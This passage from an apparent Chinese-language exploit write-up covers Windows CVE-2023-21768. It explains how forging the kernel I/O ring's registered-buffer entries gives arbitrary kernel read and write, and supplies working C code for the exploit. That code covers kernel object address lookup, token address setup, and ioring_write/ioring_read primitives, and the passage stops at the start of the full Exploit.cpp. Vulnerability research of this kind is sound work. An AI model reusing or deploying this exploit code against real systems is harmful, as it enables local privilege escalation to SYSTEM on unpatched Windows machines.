
上面两个结构体中我们需要注意的是下面的参数，分别是注册缓冲区的指针，其是相对应的，值应该也是一样的。
- `\_IORING\_OBJECT`中的`RegBuffers`和`RegBuffersCount`
- `\_HIORING`的`RegBufferArray`和`BufferArraySize`
根据Yarden Shafir的研究发现，或许我们可以不调用`BuildIoRingRegisterBuffers()`去注册缓冲区，如果我们能直接控制注册缓冲区的指针(`IoRing->RegBuffers`)直接指向我们自己的一个假缓冲区，也可以被认为我们注册了缓冲区，然后再控制列表当中的`Address`地址为内核的地址，再结合读写文件，就可以做到任意内核地址读写，并且这种并不会被探测，如果缓冲区在注册时是安全的，然后复制到内核分配，那么当它们作为操作的一部分被引用时它们仍然是安全的，这些肯定都是逆向工程那些函数得出的结论，如果十分感兴趣，自己也可以逆着玩。
当然由于我们要修改`IoRing->RegBuffers`，这个地址在内核空间，所以前提是得有个内核任意地址写漏洞。
需要注意的是在Windows 11 22H2版本下，内核中的缓冲区数组不再是地址和长度的平面数组(`IORING_BUFFER_INFO`)，而是一个新的结构体。

```c
typedef struct \_IOP\_MC\_BUFFER\_ENTRY
{
USHORT Type; // 结构体类型
USHORT Reserved; // 保留字段
ULONG Size; // 结构体大小
ULONG ReferenceCount; // 结构体引用计数
ULONG Flags; // 标志位
LIST\_ENTRY GlobalDataLink; // 全局数据链接列表
PVOID Address; // 缓冲区的地址
ULONG Length; // 缓冲区的长度
CHAR AccessMode; // 缓冲区的访问模式
ULONG MdlRef; // 缓冲区的MDL引用数
PMDL Mdl; // 缓冲区的MDL
KEVENT MdlRundownEvent; // 缓冲区的MDL结束事件
PULONG64 PfnArray; // 物理页帧号数组的指针
IOP\_MC\_BE\_PAGE\_NODE PageNodes[1]; // 物理页节点数组
} IOP\_MC\_BUFFER\_ENTRY, \*PIOP\_MC\_BUFFER\_ENTRY;
```

需要这样初始一下。
```c
mcBufferEntry->Address = TargetAddress;
mcBufferEntry->Length = Length;
mcBufferEntry->Type = 0xc02;
mcBufferEntry->Size = 0x80; // 0x20 \* (numberOfPagesInBuffer + 3)
mcBufferEntry->AccessMode = 1;
mcBufferEntry->ReferenceCount = 1;
```
然后我发现内核的这个缓冲区结构貌似和我们正常调用`BuildIoRingRegisterBuffers()`的不一样，前者是指针数组，后者是结构体数组，可能是内核和用户层有所区别吧。

### 任意地址写
步骤如下
- 先将value写入到文件中，`WriteFile()`
- 设置好要写的内核地址`TargetAddress`
- 调用`BuildIoRingReadFile()`，读取文件内容到缓冲区，也就是`TargetAddress`
图片如下。
![18.png](upload/attach/202402/926755\_9H8B8N9KF76W89H.jpg)

### 任意地址读
步骤如下
- 设置好要读的内核地址`TargetAddress`
- 调用`BuildIoRingWriteFile`，将`TargetAddress`的值写入到文件
- `ReadFile`读取文件里面的值
图片如下
![19.png](upload/attach/202402/926755\_ZF9RY6NME47NBQR.jpg)

## Exp编写
接下来进行Exp的编写。

### 内核句柄查找
解决了原理的问题，还需要解决如何获取到内核指向`\_IORING\_OBJECT`的结构体指针呢，这里需要用到常用的句柄查找技术，步骤如下
1. 定义一个`PSYSTEM_HANDLE_INFORMATION`结构体指针`pHandleInfo`，用于存储从系统中查询到的句柄信息。
2. 使用`NtQuerySystemInformation`函数查询系统句柄信息，如果查询结果长度不足，则重新分配内存空间并继续查询，直到获取到足够的句柄信息为止。
3. 遍历句柄信息，找到指定进程ID和句柄值所对应的句柄信息，从而获取到内核对象地址，并将其存储到`ppObjAddr`指针所指向的内存中。
4. 如果找到了对应的句柄信息，则返回0表示操作成功；否则返回其他错误代码。
5. 释放之前分配的内存空间。
```c
int getobjptr(PULONG64 ppObjAddr, ULONG ulPid, HANDLE handle)
{
int ret = -1;
PSYSTEM\_HANDLE\_INFORMATION pHandleInfo = NULL;
ULONG ulBytes = 0;
NTSTATUS ntStatus = STATUS\_SUCCESS;
while ((ntStatus = NtQuerySystemInformation(SystemHandleInformation, pHandleInfo, ulBytes, &ulBytes)) == STATUS\_INFO\_LENGTH\_MISMATCH)
{
if (pHandleInfo != NULL)
{
pHandleInfo = (PSYSTEM\_HANDLE\_INFORMATION)HeapReAlloc(GetProcessHeap(), HEAP\_ZERO\_MEMORY, pHandleInfo, 2 \* ulBytes);
}
else
{
pHandleInfo = (PSYSTEM\_HANDLE\_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP\_ZERO\_MEMORY, 2 \* ulBytes);
}
}
if (ntStatus != STATUS\_SUCCESS)
{
ret = ntStatus;
goto done;
}
for (ULONG i = 0; i < pHandleInfo->NumberOfHandles; i++)
{
if ((pHandleInfo->Handles[i].UniqueProcessId == ulPid) && (pHandleInfo->Handles[i].HandleValue == handle))
{
\*ppObjAddr = pHandleInfo->Handles[i].Object;
ret = 0;
break;
}
}
done:
if (NULL != pHandleInfo)
{
HeapFree(GetProcessHeap, 0, pHandleInfo);
}
return ret;
}
```

### 初始化
获取System进程Token地址，获取本进程Token地址，IORing初始化，预注册缓冲初始化，这里使用了管道代替文件，所以还需要管道初始化。
```c
BOOL Init\_CVE\_2023\_21768()
{
\_NtCreateFile = (unsigned long(\_\_stdcall\*)(PHANDLE, unsigned long, POBJECT\_ATTRIBUTES, PIO\_STATUS\_BLOCK, PLARGE\_INTEGER, unsigned long, unsigned long, unsigned long, unsigned long, void\*, unsigned long))GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateFile");
\_NtDeviceIoControlFile = (unsigned long(\_\_stdcall\*)(HANDLE, void\*, void\*, void\*, PIO\_STATUS\_BLOCK, unsigned long, void\*, unsigned long, void\*, unsigned long))GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtDeviceIoControlFile");
\_NtCreateIoCompletion = (unsigned long(\_\_stdcall\*)(PHANDLE, unsigned long, POBJECT\_ATTRIBUTES, unsigned long))GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateIoCompletion");
\_NtSetIoCompletion = (unsigned long(\_\_stdcall\*)(HANDLE, unsigned long, PIO\_STATUS\_BLOCK, NTSTATUS, unsigned long))GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetIoCompletion");
\_NtQuerySystemInformation = (unsigned long(\_\_stdcall\*)(SYSTEM\_INFORMATION\_CLASS, PVOID, ULONG, PULONG))GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
if (\_NtSetIoCompletion == NULL|| \_NtDeviceIoControlFile == NULL|| \_NtCreateFile == NULL|| \_NtCreateIoCompletion == NULL)
{
printf("get function false ");
return FALSE;
}
ioring\_init(&pIoRing);
File\_init();
FakeRegisterBuffers\_init();
TokenAddr\_init();
}
```

### 任意地址写
```c
int ioring\_write(PULONG64 pRegisterBuffers, ULONG64 pWriteAddr, PVOID pWriteBuffer, ULONG ulWriteLen)
{
int ret = -1;
PIOP\_MC\_BUFFER\_ENTRY pMcBufferEntry = NULL;
IORING\_HANDLE\_REF reqFile = IoRingHandleRefFromHandle(hInPipeClient);
IORING\_BUFFER\_REF reqBuffer = IoRingBufferRefFromIndexAndOffset(0, 0);
IORING\_CQE cqe = { 0 };
if (0 == WriteFile(hInPipe, pWriteBuffer, ulWriteLen, NULL, NULL))
{
ret = GetLastError();
goto done;
}
pMcBufferEntry = (PIOP\_MC\_BUFFER\_ENTRY)VirtualAlloc(NULL, sizeof(IOP\_MC\_BUFFER\_ENTRY), MEM\_COMMIT, PAGE\_READWRITE);
if (NULL == pMcBufferEntry)
{
ret = GetLastError();
goto done;
}
pMcBufferEntry->Address = (PVOID)pWriteAddr;
pMcBufferEntry->Length = ulWriteLen;
pMcBufferEntry->Type = 0xc02;
pMcBufferEntry->Size = 0x80;
pMcBufferEntry->AccessMode = 1;
pMcBufferEntry->ReferenceCount = 1;
pRegisterBuffers[0] = (ULONG64)pMcBufferEntry;
ret = BuildIoRingReadFile(hIoRing, reqFile, reqBuffer, ulWriteLen, 0, NULL, IOSQE\_FLAGS\_NONE);
if (0 != ret)
{
goto done;
}
ret = SubmitIoRing(hIoRing, 0, 0, NULL);
if (0 != ret)
{
goto done;
}
ret = PopIoRingCompletion(hIoRing, &cqe);
if (0 != ret)
{
goto done;
}
if (0 != cqe.ResultCode)
{
ret = cqe.ResultCode;
goto done;
}
ret = 0;
done:
if (NULL != pMcBufferEntry)
{
VirtualFree(pMcBufferEntry, sizeof(IOP\_MC\_BUFFER\_ENTRY), MEM\_RELEASE);
}
return ret;
}
```

### 任意地址读
```c
int ioring\_read(PULONG64 pRegisterBuffers, ULONG64 pReadAddr, PVOID pReadBuffer, ULONG ulReadLen)
{
int ret = -1;
PIOP\_MC\_BUFFER\_ENTRY pMcBufferEntry = NULL;
IORING\_HANDLE\_REF reqFile = IoRingHandleRefFromHandle(hOutPipeClient);
IORING\_BUFFER\_REF reqBuffer = IoRingBufferRefFromIndexAndOffset(0, 0);
IORING\_CQE cqe = { 0 };
pMcBufferEntry = (PIOP\_MC\_BUFFER\_ENTRY)VirtualAlloc(NULL, sizeof(IOP\_MC\_BUFFER\_ENTRY), MEM\_COMMIT, PAGE\_READWRITE);
if (NULL == pMcBufferEntry)
{
ret = GetLastError();
goto done;
}
pMcBufferEntry->Address = (PVOID)pReadAddr;
pMcBufferEntry->Length = ulReadLen;
pMcBufferEntry->Type = 0xc02;
pMcBufferEntry->Size = 0x80;
pMcBufferEntry->AccessMode = 1;
pMcBufferEntry->ReferenceCount = 1;
pRegisterBuffers[0] = (ULONG64)pMcBufferEntry;
ret = BuildIoRingWriteFile(hIoRing, reqFile, reqBuffer, ulReadLen, 0, FILE\_WRITE\_FLAGS\_NONE, NULL, IOSQE\_FLAGS\_NONE);
if (0 != ret)
{
goto done;
}
ret = SubmitIoRing(hIoRing, 0, 0, NULL);
if (0 != ret)
{
goto done;
}
ret = PopIoRingCompletion(hIoRing, &cqe);
if (0 != ret)
{
goto done;
}
if (0 != cqe.ResultCode)
{
ret = cqe.ResultCode;
goto done;
}
if (0 == ReadFile(hOutPipe, pReadBuffer, ulReadLen, NULL, NULL))
{
ret = GetLastError();
goto done;
}
ret = 0;
done:
if (NULL != pMcBufferEntry)
{
VirtualFree(pMcBufferEntry, sizeof(IOP\_MC\_BUFFER\_ENTRY), MEM\_RELEASE);
}
return ret;
}
```

### 总Exploit
Exploit.cpp
```c
#include <iostream>
#include <windows.h>
#include <ioringapi.h>
#include <ntstatus.h>
#include <winternl.h>
#include "structs.h"
#include "win\_defs.h"
```
